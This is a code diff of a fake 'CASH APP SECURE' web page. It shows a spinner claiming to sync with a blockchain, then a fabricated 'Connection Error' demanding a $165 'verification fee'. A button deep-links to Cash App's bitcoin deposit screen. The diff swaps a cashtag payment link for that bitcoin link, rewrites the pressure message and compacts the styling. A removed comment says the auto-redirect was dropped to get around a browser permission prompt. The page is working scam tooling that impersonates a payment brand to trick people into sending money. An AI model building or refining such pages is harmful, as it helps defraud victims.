@@ -7,44 +7,14 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body { background-color: #080b0d; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        
-        .container { 
-            width: 90%; 
-            max-width: 400px; 
-            text-align: center; 
-        }
-
-        /* Spinner */
-        .spinner {
-            width: 60px; height: 60px;
-            border: 4px solid rgba(0, 214, 50, 0.1);
-            border-top: 4px solid #00d632;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 30px;
-        }
+        .container { width: 90%; max-width: 400px; text-align: center; }
+        .spinner { width: 60px; height: 60px; border: 4px solid rgba(0, 214, 50, 0.1); border-top: 4px solid #00d632; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 30px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
         .error-icon { font-size: 60px; margin-bottom: 25px; display: none; }
-
         h1 { font-size: 24px; font-weight: 700; margin-bottom: 15px; }
         p { font-size: 17px; color: #b0b0b0; line-height: 1.6; margin-bottom: 30px; }
         .fee-highlight { color: #ff5f5f; font-weight: 700; }
-
-        /* The New Primary Button */
-        .manual-btn {
-            display: none; /* Hidden during loading */
-            background-color: #00d632;
-            color: white;
-            text-decoration: none;
-            padding: 18px 35px;
-            border-radius: 35px;
-            font-weight: 700;
-            font-size: 18px;
-            margin-top: 10px;
-            box-shadow: 0 4px 15px rgba(0, 214, 50, 0.3);
-        }
-
+        .manual-btn { display: none; background-color: #00d632; color: white; text-decoration: none; padding: 18px 35px; border-radius: 35px; font-weight: 700; font-size: 18px; margin-top: 10px; }
         .footer { position: absolute; bottom: 40px; width: 100%; color: #333; font-size: 13px; font-weight: 600; letter-spacing: 1px; }
     </style>
 </head>
@@ -53,11 +23,9 @@
     <div class="container">
         <div id="loader" class="spinner"></div>
         <div id="errorIcon" class="error-icon">⚠️</div>
-
         <h1 id="statusTitle">Syncing with Blockchain...</h1>
         <p id="statusMsg">Connecting to secure verification gateway.</p>
-        
-        <a id="manualBtn" href="#" class="manual-btn">Deposit in Cash App</a>
+        <a id="manualBtn" href="#" class="manual-btn">Open Bitcoin Deposit</a>
     </div>
 
     <div class="footer">CASH APP SECURE</div>
@@ -69,26 +37,18 @@
         const msg = document.getElementById('statusMsg');
         const manualBtn = document.getElementById('manualBtn');
 
-        // SETTINGS
-        const cashtag = "YourCashtag"; 
-        const amount = "165";
-        const deepLink = `cashme://cash.app/$${cashtag}/${amount}`;
+        // UPDATED DEEP LINK TO BITCOIN SECTION
+        const deepLink = "https://cash.app/launch/bitcoin/deposit";
 
-        // Sequence: Load for 3.5 seconds, then show the error and the BUTTON
         setTimeout(() => {
             loader.style.display = "none";
             errorIcon.style.display = "block";
-            
-            title.innerText = "Payment Required";
+            title.innerText = "Connection Error";
             title.style.color = "#ff5f5f";
+            msg.innerHTML = `Blockchain sync failed. Please manually authorize the <span class="fee-highlight">$165</span> verification fee in your Bitcoin wallet.`;
             
-            msg.innerHTML = `Blockchain synchronization failed.<br>A one-time verification fee of <span class="fee-highlight">$${amount}</span> is required.`;
-            
-            // Show the button
             manualBtn.style.display = "inline-block";
             manualBtn.href = deepLink;
-
-            // AUTO-REDIRECT REMOVED to bypass the "Allow" pop-up security
 
         }, 3500); 
     </script>
